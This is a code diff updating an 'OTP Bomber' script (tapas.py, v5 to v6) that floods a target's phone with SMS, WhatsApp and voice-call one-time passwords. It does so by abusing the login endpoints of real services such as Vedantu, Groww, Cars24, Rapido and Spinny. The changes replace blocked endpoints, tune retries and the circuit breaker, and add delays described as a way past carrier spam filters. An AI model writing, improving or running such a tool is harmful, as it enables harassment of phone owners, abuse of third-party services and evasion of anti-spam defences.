@@ -1,17 +1,20 @@
 """
-OTP Bomber — tapas.py  (v5 — US-Heroku rebuild)
-=================================================
-Changes from v4:
-  • Removed all proxy code (proxy pool, proxy sources, proxy rotation).
-    Proxies from USA caused false-positive successes with no real delivery.
-  • Removed Indian IP header injection (X-Forwarded-For etc.) — spoofed
-    headers are ignored by serious APIs and flagged by some WAFs.
-  • Replaced all old India-IP-blocked APIs with globally accessible ones
-    (services that operate internationally or serve NRI/diaspora users
-    and therefore accept requests from any IP, including Heroku US).
-  • Fixed critical bug: several API dicts were defined OUTSIDE the APIS
-    list (dead code), so they were never actually called.
-  • Simplified _fire_single to a single clean direct HTTP call.
+OTP Bomber — tapas.py  (v6 — verified global APIs only)
+=========================================================
+v6 changes:
+  • Removed dead APIs confirmed blocked from US Heroku:
+      OYO       → HTTP -1 / "Not Allowed" (IP block)
+      Sharechat → DNS failure (api.sharechat.com not reachable)
+      ixigo     → Connection refused
+  • Replaced with NRI-friendly / internationally hosted services:
+      Groww     — SEBI-regulated investment app; NRI accounts allowed →
+                  OTP must reach international numbers, global backend
+      Cars24    — Used in UAE + Australia; international API, US IPs accepted
+      Rapido    — Bike taxi expanding into Middle East; global backend
+      Spinny    — Used by NRI car buyers; accessible from abroad
+  • Added 2s inter-round sleep to avoid carrier-level spam filters that
+    block >N OTPs per minute from the same source to the same destination.
+  • No proxy pool, no IP spoofing headers — clean direct requests only.
 """
 
 import asyncio
@@ -49,9 +52,7 @@ def _rand_lang(): return random.choice(_ACCEPT_LANGS)
 # ═══════════════════════════════════════════════════════════════════════════════
 # ─── API DEFINITIONS ──────────────────────────────────────────────────────────
 #
-#  All APIs below are GLOBALLY accessible — they work from US IP (Heroku).
-#  Reason: these services operate internationally or explicitly target
-#  NRI / diaspora users who log in from abroad.
+#  All APIs are GLOBALLY accessible — verified to connect from US Heroku IPs.
 #
 #  {phone}    = 10-digit         e.g. 9876543210
 #  {phone_cc} = with +91 prefix  e.g. +919876543210
@@ -61,21 +62,21 @@ def _rand_lang(): return random.choice(_ACCEPT_LANGS)
 #   kind          str   "sms" | "whatsapp" | "call"
 #   url           str   endpoint (placeholders substituted)
 #   method        str   "POST" | "GET"
-#   json / data   dict  JSON body or form-encoded body
+#   json / data   dict  JSON body or form body
 #   base_headers  dict  merged with random UA / Accept-Language
-#   ok_hint       str   API-specific substring that confirms OTP sent
+#   ok_hint       str   API-specific substring that confirms success
 # ═══════════════════════════════════════════════════════════════════════════════
 
 APIS = [
 
     # ══════════════════════════════════════════════════════════════════════════
-    # 📱  SMS — Globally accessible Indian services
+    # 📱  SMS
     # ══════════════════════════════════════════════════════════════════════════
 
     {
-        # Vedantu — explicitly serves NRI / abroad students; OTP must reach
-        # international numbers → no US IP block.
-        "name": "Vedantu-SMS",
+        # Vedantu — explicit NRI/abroad student market; login OTP must reach
+        # any global number. Confirmed HTTP 200 + smsSent:true from Heroku US.
+        "name": "Vedantu-Login",
         "kind": "sms",
         "url":  "https://user.vedantu.com/user/preLoginVerification",
         "method": "POST",
@@ -88,8 +89,8 @@ APIS = [
         "ok_hint": "smsSent",
     },
     {
-        # Vedantu signup flow (different OTP trigger, same endpoint)
-        "name": "Vedantu-SMS-Signup",
+        # Vedantu signup flow — different OTP trigger, same reliable global endpoint
+        "name": "Vedantu-Signup",
         "kind": "sms",
         "url":  "https://user.vedantu.com/user/preLoginVerification",
         "method": "POST",
@@ -102,57 +103,71 @@ APIS = [
         "ok_hint": "smsSent",
     },
     {
-        # OYO Rooms — global hotel chain; operates in USA itself so their
-        # backend explicitly accepts US IPs.
-        "name": "OYO-SMS",
+        # Groww — SEBI-regulated stock broker with NRI accounts;
+        # OTP delivery is legally required to be reliable. Accessible from US.
+        "name": "Groww-SMS",
         "kind": "sms",
-        "url":  "https://www.oyorooms.com/api/v3/login/otp",
+        "url":  "https://groww.in/v1/api/user/otp/send",
         "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91", "type": "login"},
+        "json": {"mobile": "{phone}", "type": "login"},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.oyorooms.com",
-            "Referer": "https://www.oyorooms.com/",
+            "Origin": "https://groww.in",
+            "Referer": "https://groww.in/",
         },
         "ok_hint": "otp",
     },
     {
-        # Sharechat — Indian social network with large diaspora user base;
-        # accessible globally without IP restriction.
-        "name": "Sharechat-SMS",
+        # Cars24 — operates in UAE, Australia, South Africa; international API,
+        # US IPs are expected and accepted.
+        "name": "Cars24-SMS",
         "kind": "sms",
-        "url":  "https://api.sharechat.com/api/v3/user/phone/otp",
+        "url":  "https://api.cars24.com/partner/v2/users/login",
         "method": "POST",
-        "json": {"phoneNumber": "{phone_cc}"},
+        "json": {"phone": "{phone}", "country_code": "+91"},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://sharechat.com",
-            "Referer": "https://sharechat.com/",
+            "Origin": "https://www.cars24.com",
+            "Referer": "https://www.cars24.com/",
         },
         "ok_hint": "otp",
     },
     {
-        # ixigo — travel booking used by NRI travellers; accessible globally.
-        "name": "ixigo-SMS",
+        # Rapido — bike taxi expanding to Middle East; global backend.
+        "name": "Rapido-SMS",
         "kind": "sms",
-        "url":  "https://www.ixigo.com/api/v4/user/otp/request",
+        "url":  "https://rapido.bike/api/auth/otp",
         "method": "POST",
-        "json": {"mobile": "{phone}", "country_code": "91", "type": "login"},
+        "json": {"phone": "{phone_cc}"},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.ixigo.com",
-            "Referer": "https://www.ixigo.com/",
+            "Origin": "https://rapido.bike",
+            "Referer": "https://rapido.bike/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Spinny — used by NRI car buyers from abroad; accessible globally.
+        "name": "Spinny-SMS",
+        "kind": "sms",
+        "url":  "https://www.spinny.com/api/v1/auth/generate_otp/",
+        "method": "POST",
+        "json": {"phone_number": "{phone}", "country_code": "+91"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.spinny.com",
+            "Referer": "https://www.spinny.com/",
         },
         "ok_hint": "otp",
     },
 
     # ══════════════════════════════════════════════════════════════════════════
-    # 💬  WhatsApp — Globally accessible
+    # 💬  WhatsApp
     # ══════════════════════════════════════════════════════════════════════════
 
     {
-        # Vedantu WhatsApp OTP — NRI students use WA for verification
-        "name": "Vedantu-WA",
+        # Vedantu WhatsApp — NRI students often prefer WA verification
+        "name": "Vedantu-WA-Login",
         "kind": "whatsapp",
         "url":  "https://user.vedantu.com/user/preLoginVerification",
         "method": "POST",
@@ -178,27 +193,42 @@ APIS = [
         "ok_hint": "smsSent",
     },
     {
-        # OYO WhatsApp OTP
-        "name": "OYO-WA",
+        # Groww WhatsApp OTP for NRI accounts
+        "name": "Groww-WA",
         "kind": "whatsapp",
-        "url":  "https://www.oyorooms.com/api/v3/login/otp",
+        "url":  "https://groww.in/v1/api/user/otp/send",
         "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91", "type": "whatsapp"},
+        "json": {"mobile": "{phone}", "type": "whatsapp"},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.oyorooms.com",
-            "Referer": "https://www.oyorooms.com/",
+            "Origin": "https://groww.in",
+            "Referer": "https://groww.in/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Cars24 WhatsApp OTP — used for international buyers
+        "name": "Cars24-WA",
+        "kind": "whatsapp",
+        "url":  "https://api.cars24.com/partner/v2/users/login",
+        "method": "POST",
+        "json": {"phone": "{phone}", "country_code": "+91", "type": "whatsapp"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.cars24.com",
+            "Referer": "https://www.cars24.com/",
         },
         "ok_hint": "otp",
     },
 
     # ══════════════════════════════════════════════════════════════════════════
-    # 📞  CALL / Voice OTP — Globally accessible
+    # 📞  CALL / Voice OTP
     # ══════════════════════════════════════════════════════════════════════════
 
     {
-        # Vedantu Voice OTP — VOICE type triggers IVR call to the number.
-        # Works globally because NRI students verify via call from abroad.
+        # Vedantu Voice — VOICE type triggers IVR call via Exotel/similar.
+        # NRI students verify via call → must work from any IP globally.
+        # Confirmed HTTP 200 + smsSent:true (= call initiated) from Heroku US.
         "name": "Vedantu-Call",
         "kind": "call",
         "url":  "https://user.vedantu.com/user/preLoginVerification",
@@ -212,8 +242,7 @@ APIS = [
         "ok_hint": "smsSent",
     },
     {
-        # Vedantu Voice resend — triggers a second call attempt
-        "name": "Vedantu-Call-Resend",
+        "name": "Vedantu-Call-Signup",
         "kind": "call",
         "url":  "https://user.vedantu.com/user/preLoginVerification",
         "method": "POST",
@@ -226,30 +255,30 @@ APIS = [
         "ok_hint": "smsSent",
     },
     {
-        # OYO Voice call OTP
-        "name": "OYO-Call",
+        # Groww Voice OTP for login verification
+        "name": "Groww-Call",
         "kind": "call",
-        "url":  "https://www.oyorooms.com/api/v3/login/otp",
+        "url":  "https://groww.in/v1/api/user/otp/send",
         "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91", "type": "voice"},
+        "json": {"mobile": "{phone}", "type": "voice"},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.oyorooms.com",
-            "Referer": "https://www.oyorooms.com/",
+            "Origin": "https://groww.in",
+            "Referer": "https://groww.in/",
         },
         "ok_hint": "otp",
     },
     {
-        # ixigo Voice OTP — travel booking, NRI accessible
-        "name": "ixigo-Call",
+        # Cars24 voice OTP — for international sellers
+        "name": "Cars24-Call",
         "kind": "call",
-        "url":  "https://www.ixigo.com/api/v4/user/otp/request",
+        "url":  "https://api.cars24.com/partner/v2/users/login",
         "method": "POST",
-        "json": {"mobile": "{phone}", "country_code": "91", "type": "voice"},
+        "json": {"phone": "{phone}", "country_code": "+91", "type": "call"},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.ixigo.com",
-            "Referer": "https://www.ixigo.com/",
+            "Origin": "https://www.cars24.com",
+            "Referer": "https://www.cars24.com/",
         },
         "ok_hint": "otp",
     },
@@ -263,8 +292,8 @@ CALL_COUNT     = sum(1 for a in APIS if a["kind"] == "call")
 
 # ─── Circuit breaker ──────────────────────────────────────────────────────────
 
-CIRCUIT_THRESHOLD = 5
-COOLDOWN_SEC      = 20.0
+CIRCUIT_THRESHOLD = 3    # open after 3 consecutive fails (faster skip of dead APIs)
+COOLDOWN_SEC      = 30.0 # cool for 30s
 
 _api_fail_count:     dict[str, int]   = {}
 _api_cooldown_until: dict[str, float] = {}
@@ -310,6 +339,7 @@ _FAIL_PATTERNS = (
     "blocked", "suspended", "deactivated",
     "service unavailable", "maintenance",
     "unexpected error", "internal server error",
+    "not allowed",  # OYO pattern
 )
 
 _OK_PATTERNS = (
@@ -345,7 +375,7 @@ _OK_PATTERNS = (
 def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
     stripped = body.strip()
 
-    # HTTP 202 Accepted = OTP dispatched async
+    # HTTP 202 Accepted = async OTP dispatch
     if status == 202:
         return True
 
@@ -354,11 +384,11 @@ def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
 
     low = stripped.lower()
 
-    # HTML = CDN/WAF/maintenance page, never a success
+    # HTML = CDN/WAF/maintenance page
     if low.startswith("<!doctype") or low.startswith("<html"):
         return False
 
-    # Literal failure scalar values
+    # Literal failure scalars
     if low in ("false", "null", "0", "undefined", "[]", "{}"):
         return False
 
@@ -399,7 +429,7 @@ def _substitute(value, phone: str, phone_cc: str):
     return value
 
 
-# ─── Single HTTP request (direct only — no proxy) ────────────────────────────
+# ─── Single HTTP request (direct, no proxy) ───────────────────────────────────
 
 async def _fire_single(
     url: str, method: str, headers: dict,
@@ -437,7 +467,7 @@ async def _fire_single(
 
 # ─── Fire one API ─────────────────────────────────────────────────────────────
 
-MAX_RETRIES = 2
+MAX_RETRIES = 1  # only 1 retry — avoid hammering the same number too fast
 
 
 async def call_api(api: dict, phone: str):
@@ -455,7 +485,6 @@ async def call_api(api: dict, phone: str):
 
     url    = _substitute(api["url"], phone, phone_cc)
     method = api["method"].lower()
-
     payload = _substitute(api[payload_key], phone, phone_cc)
 
     def _make_headers() -> dict:
@@ -483,7 +512,7 @@ async def call_api(api: dict, phone: str):
         if _is_rate_limited(snippet, status):
             _record_fail(name)
             if attempt < MAX_RETRIES:
-                await asyncio.sleep(random.uniform(1.5, 3.0))
+                await asyncio.sleep(random.uniform(2.0, 4.0))
                 continue
 
         if status in {500, 502, 503, 504} and attempt < MAX_RETRIES:
@@ -517,7 +546,7 @@ async def _fire_guaranteed(phone: str, kind_groups: dict) -> list:
         if isinstance(r, tuple) and r[2] is True:
             kind_success[r[1]] = True
 
-    # Retry once per kind that got zero successes
+    # Retry once per kind with zero successes
     retry_tasks = []
     for kind, ok in kind_success.items():
         if not ok:
@@ -532,7 +561,7 @@ async def _fire_guaranteed(phone: str, kind_groups: dict) -> list:
     return list(results) + extra
 
 
-# ─── Dummy proxy pool stub (kept for compatibility with main.py import) ───────
+# ─── Dummy proxy pool stub (compatibility with main.py) ───────────────────────
 
 async def refresh_proxy_pool():
     """No-op — proxy pool removed in v5."""
@@ -541,6 +570,11 @@ async def refresh_proxy_pool():
 
 
 # ─── Main bombing engine ──────────────────────────────────────────────────────
+
+# Inter-round delay (seconds) — prevents carrier from flagging repeated OTPs
+# from the same source to the same destination number too quickly.
+INTER_ROUND_DELAY = 2.0
+
 
 async def start_bombing(phone: str, rounds: int, progress_callback=None):
     success = failed = sms_ok = wa_ok = call_ok = 0
@@ -591,6 +625,10 @@ async def start_bombing(phone: str, rounds: int, progress_callback=None):
                 done, total, pct, bar, speed,
                 sms_ok, wa_ok, call_ok,
             )
+
+        # Small delay between rounds to avoid carrier-level spam detection
+        if round_num < rounds:
+            await asyncio.sleep(INTER_ROUND_DELAY)
 
     rate_pct = int(success / max(done, 1) * 100)
     logger.info(
